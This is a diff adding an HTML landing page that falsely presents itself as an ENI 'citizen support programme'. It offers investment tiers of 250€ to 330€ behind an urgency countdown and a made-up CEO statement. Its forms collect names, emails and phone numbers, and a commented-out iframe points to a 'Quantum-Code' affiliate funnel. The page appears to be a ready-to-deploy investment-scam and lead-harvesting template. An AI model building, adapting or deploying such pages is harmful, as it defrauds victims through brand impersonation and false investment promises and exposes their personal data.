@@ -1,0 +1,284 @@
+<!doctype html>
+<html>
+
+<head>
+    <!-- 55 - 126 [o107;l1] eni -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>ENI</title>
+    <link rel="icon" href="img/fav.webp">
+    <link href="css/aos.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/form.css">
+    <link rel="stylesheet" href="css/modal.css">
+    <link rel="stylesheet" href="css/intlTelInput.min.css">
+    <link href="assets/landing/css/landing.css" rel="stylesheet" type="text/css">
+<!--[HEADER]--></head>
+
+<body>
+    <!-- preloader -->
+    <div id="loader" style="display: none">
+        <img src="images/preloader.svg" alt="Preloader" />
+      </div>
+      <!-- preloader end -->
+
+      <div style="width: 100%; background: red; text-align: center; position: fixed; z-index: 100">
+        <div id="timer">
+          <div class="timer-title">Affrettarsi!</div>
+          <div class="counter-wrapper">
+            <span class="hours">00</span>:<span class="minutes">00</span>:<span class="seconds"
+              >00</span
+            >
+          </div>
+        </div>
+      </div>
+
+    <div class="preloader">
+        <div class="preloader__screen">
+            <div class="preloader__screen-overlay"></div>
+            <div class="preloader__screen-part preloader__screen-part_left"></div>
+            <div class="preloader__screen-part preloader__screen-part_right"></div>
+            <div class="preloader__logo">
+                <img src="img/eni_logo.webp" alt="logo" class="logo">
+            </div>
+        </div>
+    </div>
+    <header class="header">
+        <div class="header__top">
+            <div class="container">
+                <div class="header__offer">
+                    Integrated Report <span class="footer-year"></span> | ENI Ente Nazionale Idrocarburi
+                </div>
+            </div>
+        </div>
+        <div class="header__bottom">
+            <div class="container">
+                <div class="header__inner">
+                    <div class="header__logo">
+                        <img src="img/eni_logo.webp" alt="logo" class="logo">
+                        <span>
+                            ENI <br> Ente Nazionale Idrocarburi
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+    <section class="intro">
+        <div class="container">
+            <h2 class="intro__title">
+                <span>ENI Ente Nazionale Idrocarburi </span>lancia il programma di sostegno ai cittadini
+            </h2>
+            <div class="intro__inner">
+                <div class="intro__form" id="form">
+                    <form method="post" class="form-container" novalidate>
+                        <div class="form__group form_group--name">
+                            <input name="firstName" placeholder="Nome">
+                        </div>
+                        <div class="form__group form_group--name">
+                            <input placeholder="Cognome" name="lastName">
+                        </div>
+                        <div class="form__group form_group--email">
+                            <input type="email" name="email" placeholder="Email">
+                        </div>
+                        <div class="form__group form_input--group">
+                            <input type="tel" class="phone" name="phone">
+                        </div>
+                        <div class="form_group--button">
+                            <button class="send-form btn btn-primary" type="submit" name="submit">
+                                <span class="button--inner">registrazione</span>
+                            </button>
+                        </div>
+                    </form>
+                </div>
+                <div class="intro__video" data-aos="zoom-in">
+                    <img src="img/poster.webp" alt="">
+                </div>
+            </div>
+        </div>
+        <div class="intro__overlay"></div>
+    </section>
+    <section class="business">
+        <div class="container">
+            <h3 class="business__title">
+                Progetti di investimento ENI Ente Nazionale Idrocarburi
+            </h3>
+            <div class="business__project">
+                <div data-aos="fade-right" class="protect__item">
+                    <h4 class="item__title">
+                        Estrazione e produzione
+                    </h4>
+                    <div class="item__content">
+                        <div class="item__img">
+                            <img src="img/1.webp" alt="">
+                            <div class="img__overlay"></div>
+                        </div>
+                        <div class="item__text">
+                            <p>
+                                Produzione di petrolio e gas naturale in 44 paesi.
+                            </p>
+                            <button data-url="#form" class="project__btn to-form">
+                                Investimento 250€
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                <div data-aos="fade-left" class="protect__item">
+                    <h4 class="item__title">
+                        Gas ed elettricità
+                    </h4>
+                    <div class="item__content">
+                        <div class="item__img">
+                            <img src="img/4.webp" alt="">
+                            <div class="img__overlay"></div>
+                        </div>
+                        <div class="item__text">
+                            <p>
+                                Trasporto e commercializzazione di gas naturale ed elettricità
+                            </p>
+                            <button data-url="#form" class="project__btn to-form">
+                                Investimento 299€
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                <div data-aos="fade-right" class="protect__item">
+                    <h4 class="item__title">
+                        Raffinazione e distribuzione
+                    </h4>
+                    <div class="item__content">
+                        <div class="item__img">
+                            <img src="img/3.webp" alt="">
+                            <div class="img__overlay"></div>
+                        </div>
+                        <div class="item__text">
+                            <p>
+                                Trasporto, raffinazione e commercializzazione di petrolio e prodotti petroliferi.
+                            </p>
+                            <button data-url="#form" class="project__btn to-form">
+                                Investimento 330€
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <section class="present">
+        <div class="container">
+            <div class="present__inner">
+                <div class="present__box">
+                    <div data-aos="zoom-in" class="present__img">
+                        <img src="img/presedent.webp" alt="">
+                    </div>
+                    <div class="present__content">
+                        <p data-aos="fade-right">
+                            Il mercato, i nostri azionisti, i clienti e i partner commerciali si aspettano che la più grande compagnia petrolifera italiana non solo analizzi e reagisca costantemente all'ambiente, ma che sviluppi anche soluzioni proprie, stabilendo così le tendenze per l'industria petrolifera.
+                        </p>
+                        <p data-aos="fade-left">
+                            I processi decisionali nel business del petrolio sono molto complessi. Quindi, oltre ai calcoli economici, alle considerazioni normative e alle necessità del sistema energetico italiano, vedo anche la necessità di mantenere un dialogo continuo con il pubblico e di fare passi per ottenere l'approvazione pubblica delle azioni che facciamo. Con l'assunzione della carica di Presidente ho raccolto la sfida di dare una spinta manageriale al gruppo ENI, insieme al gruppo dirigente!
+                        </p>
+                        <span data-aos="fade-up" class="president">CEO</span>
+                        <span data-aos="fade-up" class="president-sub">Eni SpA Ente Nazionale Idrocarburi </span>
+                    </div>
+                </div>
+                <div class="pdfs">
+                    <a href="doc/eni.pdf" target="_blank">
+                        <img src="img/pdf-file.svg" alt="">
+                        <span>Zapraszamy do zapoznania się z prezentacją firmy.</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </section>
+    <footer>
+        <div class="container">
+            <div class="footer__logo">
+                <img src="img/eni_logo.webp" alt="logo" class="logo">
+            </div>
+            <p>
+                © ENI Ente Nazionale Idrocarburi.
+        </div>
+    </footer>
+    <!-- Модальное окно -->
+    <div id="myModal" class="modal">
+        <div class="modal-content">
+          <span class="close">&times;</span>
+          <div class="elementor-widget-container">
+            <!-- <iframe
+              src="https://pro-lmz.xyz/step-1/ficrm/Quantum-CodeWWP?trafficSource=938a9408-b282-419c-a58a-347fd612a9e5&amp;"
+              width="300px" height="250px"
+              frameborder="0"><span
+                data-mce-type="bookmark"
+                style="display: inline-block; width: 0px; overflow: hidden; line-height: 0;"
+                class="mce_SELRES_start">﻿</span></iframe> -->
+                <div class="pl-6 block w-1/3 sm:p-0 sm:w-full">
+                  <div class="wrapper-form-header">
+                    <h2 class="intro__title">
+                <span>ENI Ente Nazionale Idrocarburi </span>lancia il programma di sostegno ai cittadini
+            </h2>
+            <div class="intro__inner">
+                <div class="intro__form" id="form">
+                    <form method="post" class="form-container" novalidate>
+                        <div class="form__group form_group--name">
+                            <input name="firstName" placeholder="Nome">
+                        </div>
+                        <div class="form__group form_group--name">
+                            <input placeholder="Cognome" name="lastName">
+                        </div>
+                        <div class="form__group form_group--email">
+                            <input type="email" name="email" placeholder="Email">
+                        </div>
+                        <div class="form__group form_input--group">
+                            <input type="tel" class="phone" name="phone">
+                        </div>
+                        <div class="form_group--button">
+                            <button class="send-form btn btn-primary" type="submit" name="submit">
+                                <span class="button--inner">registrazione</span>
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+                  </div>
+                </div>
+          </div>
+        </div>
+       
+        </div>
+      </div>
+
+    <!-- intl-tel-input -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/18.2.1/css/intlTelInput.css"
+    />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/18.2.1/js/intlTelInput.min.js"></script>
+
+    <script type="text/javascript" src="assets/landing/js/jquery.min.js"></script>
+    <!-- <script type="text/javascript" src="assets/landing/js/jquery.validate.min.js"></script> -->
+    <!-- <script type="text/javascript" src="assets/landing/js/form.js"></script> -->
+    <script src="js/aos.js"></script>
+    <script>
+    AOS.init({
+        disableMutationObserver: false
+    });
+    document.addEventListener('DOMContentLoaded', function() {
+        setTimeout(function() {
+            $('.footer-year').append(new Date().getFullYear());
+        }, 2000);
+    });
+    </script>
+    <script src="js/main.js"></script>
+
+
+    <script src="js/script.js"></script>
+    <script src="js/imask.js"></script>
+    <script src="js/jsAdapter.js"></script>
+    <script src="js/pixelInitPageView.js"></script>
+    <script src="js/validate.min.js"></script>
+    <script src="js/modal-form-and-timer.js"></script>
+</body>
+
+</html>
